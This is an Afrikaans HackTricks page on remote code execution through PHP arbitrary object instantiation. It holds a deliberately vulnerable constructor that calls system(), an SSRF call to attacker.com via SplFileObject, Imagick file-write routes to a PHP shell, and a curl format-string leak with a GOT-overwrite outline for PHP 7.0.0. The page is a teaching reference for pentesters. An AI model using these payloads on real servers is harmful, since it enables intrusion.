# PHP - RCE misbruik van objekskepping: new $_GET["a"]($_GET["b"])

{{#include ../../../banners/hacktricks-training.md}}

Dit is basies 'n samevatting van [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Inleiding

Die skepping van nuwe arbitrêre objekte, soos `new $_GET["a"]($_GET["a"])`, kan lei tot Remote Code Execution (RCE), soos uiteengesit in 'n [**verslag**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/). Hierdie dokument beklemtoon verskeie strategieë om RCE te bereik.

## RCE via Aangepaste Klasse of Autoloading

Die sintaksis `new $a($b)` word gebruik om 'n objek te instansieer waar **`$a`** die klasnaam voorstel en **`$b`** die eerste argument is wat aan die konstruktor deurgegee word. Hierdie veranderlikes kan uit gebruikersinsette soos GET/POST afkomstig wees, waar hulle strings of arrays kan wees, of uit JSON, waar hulle as ander tipes kan voorkom.

Oorweeg die kode-fragment hieronder:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
In hierdie geval, deur `$a` op `App` of `App2` te stel en `$b` op 'n stelselopdrag (bv. `uname -a`), lei dit tot die uitvoering van daardie opdrag.

**Outomatiese laaifunksies** kan uitgebuit word as geen sulke klasse direk toeganklik is nie. Hierdie funksies laai klases outomaties vanuit lêers wanneer nodig en word gedefinieer met `spl_autoload_register` of `__autoload`:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
Die gedrag van autoloading wissel tussen PHP-weergawes en bied verskeie RCE-mooglikhede.

## RCE via ingeboude PHP-klasse

As daar geen pasgemaakte klasse of autoloaders is nie, kan **ingeboude PHP-klasse** genoeg wees vir RCE. Die aantal van hierdie klasse wissel tussen ongeveer 100 en 200, afhangend van die PHP-weergawes en geïnstalleerde uitbreidings. Hulle kan opgelys word met `get_declared_classes()`.

Konstruktore van belang kan met die reflection API geïdentifiseer word, soos gewys in die volgende voorbeeld en die skakel [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF).

**RCE via spesifieke metodes sluit in:**

### **SSRF + Phar Deserialization**

Die `SplFileObject` klas maak SSRF moontlik via sy konstruktor, wat verbindinge na enige URL toelaat:
```php
new SplFileObject('http://attacker.com/');
```
SSRF kan tot deserialization-aanvalle lei in weergawes van PHP voor 8.0 deur die Phar-protokol te gebruik.

### **Uitbuiting van PDOs**

Die PDO class constructor laat verbindings na databasisse toe via DSN strings, wat moontlik lêercreatie of ander interaksies moontlik maak:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

Weergawe van PHP tot en met 5.3.22 en 5.4.12 was kwesbaar vir XXE-aanvalle via die `SoapClient` en `SimpleXMLElement` konstruktors, afhangend van die weergawe van libxml2.

## RCE via Imagick-uitbreiding

In die ontleding van 'n **projek se afhanklikhede** is ontdek dat **Imagick** benut kan word vir **command execution** deur nuwe objekte te instansieer. Dit bied 'n geleentheid om kwesbaarhede uit te buit.

### VID parser

Die VID parser se vermoë om inhoud na enige gespesifiseerde pad in die lêerstelsel te skryf is geïdentifiseer. Dit kan lei tot die plaas van 'n PHP shell in 'n web-toeganklike gids, wat Remote Code Execution (RCE) bewerkstellig.

#### VID Parser + File Upload

Daar word aangetoon dat PHP opgelaaide lêers tydelik in `/tmp/phpXXXXXX` stoor. Die VID parser in Imagick, wat die **msl** protokol gebruik, kan jokertekens in lêerpaaie hanteer, wat die oordrag van die tydelike lêer na 'n gekose ligging vergemakel. Hierdie metode bied 'n addisionele manier om arbitrêre lêerskryf in die lêerstelsel te bereik.

### PHP Crash + Brute Force

Metode beskryf in die [**original writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) behels die oplaai van lêers wat 'n bedienercrash veroorsaak voordat hulle verwyder word. Deur die naam van die tydelike lêer te brute-forseer, word dit moontlik vir Imagick om arbitrêre PHP-kode uit te voer. Hierdie tegniek is egter slegs effektief in 'n verouderde weergawe van ImageMagick gevind.

## Format-string in class-name resolution (PHP 7.0.0 Bug #71105)

Wanneer gebruikersinvoer die klasnaam beheer (bv. `new $_GET['model']()`), het PHP 7.0.0 'n tydelike fout ingevoer tydens die `Throwable` refaktorering waar die engine per ongeluk die klasnaam as 'n printf-formaatstring tydens resolusie beskou het. Dit maak klassieke printf-styl primitiewe binne PHP moontlik: leaks met `%p`, skryf-tellingbeheer met breedtespesifiseerders, en arbitrêre skrywes met `%n` teen in-proses wysigers (bv. GOT-inskrywings op ELF-bouings).

Minimale reproduseerbare kwesbare patroon:
```php
<?php
$model = $_GET['model'];
$object = new $model();
```
Exploitation outline (from the reference):
- Leak adresse via `%p` in die klasnaam om 'n skryfbare teiken te vind:
```bash
curl "http://host/index.php?model=%p-%p-%p"
# Fatal error includes resolved string with leaked pointers
```
- Gebruik positional parameters en width specifiers om 'n presiese byte-aantal te stel, en gebruik dan `%n` om daardie waarde na 'n adres op die stack te skryf, mik na 'n GOT slot (bv. `free`) om dit gedeeltelik met `system` oor te skryf.
- Trigger die gekaapte funksie deur 'n klasnaam te stuur wat 'n shell pipe bevat om by `system("id")` uit te kom.

Notes:
- Werk slegs op PHP 7.0.0 (Bug [#71105](https://bugs.php.net/bug.php?id=71105)); reggestel in daarnae vrystellings. Ernstigheid: kritiek as arbitêre klasinstansiasie bestaan.
- Tipiese payloads ketting baie `%p` om die stack te deurloop, en dan `%.<width>d%<pos>$n` om die gedeeltelike oor-skrywing te laat land.

## References

- [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../../banners/hacktricks-training.md}}
